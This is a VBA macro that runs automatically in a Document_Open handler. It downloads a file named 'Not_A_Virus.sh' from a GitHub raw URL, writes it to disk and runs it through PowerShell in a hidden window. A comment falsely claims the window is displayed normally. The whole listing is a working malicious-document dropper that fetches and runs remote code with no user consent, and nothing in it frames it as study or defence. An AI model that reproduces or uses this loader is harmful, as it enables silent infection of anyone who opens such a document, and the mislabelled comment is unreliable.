Private Sub Document_Open()
    ' VBScript to download a file from the internet

    Dim httpRequest, stream
    Set httpRequest = CreateObject("MSXML2.XMLHTTP")
    
    ' Specify the URL of the file to download
    Dim fileUrl
    fileUrl = "https://raw.githubusercontent.com/Aleshhh/ucases-s4.github.io/main/Not_A_Virus.sh"
    
    ' Specify the path where the file should be saved
    Dim filePath
    filePath = ".\Not_A_Virus.sh"
    
    ' Open the HTTP request
    httpRequest.Open "GET", fileUrl, False
    httpRequest.Send
    
    If httpRequest.Status = 200 Then
        ' Create the stream object to write the content to a file
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1 'Binary
        stream.Write httpRequest.ResponseBody
        stream.Position = 0
        
        ' Save the file
        stream.SaveToFile filePath, 2 '2 = overwrite if file already exists
        stream.Close
        Set stream = Nothing
    Else
        MsgBox "Failed to download the file. Status: " & httpRequest.Status
    End If
    
    Set httpRequest = Nothing
    
    
    
    ' Set WshShell = WScript.CreateObject("WScript.Shell")
    ' WshShell.Run "powershell.exe -nologo -command .\Not_A_Virus.sh"



    Dim wsh As Object
    Set wsh = VBA.CreateObject("WScript.Shell")

    ' Adjust the path to the location of your shell interpreter and script
    Dim shellInterpreter As String
    Dim scriptPath As String

    ' Construct the command to execute
    Dim command As String
    command = "powershell.exe -nologo -command .\Not_A_Virus.sh"

    ' Run the command
    wsh.Run command, 0, True  ' The window style 1 means the window is activated and displayed normally, True waits for the command to complete

    Set wsh = Nothing
End Sub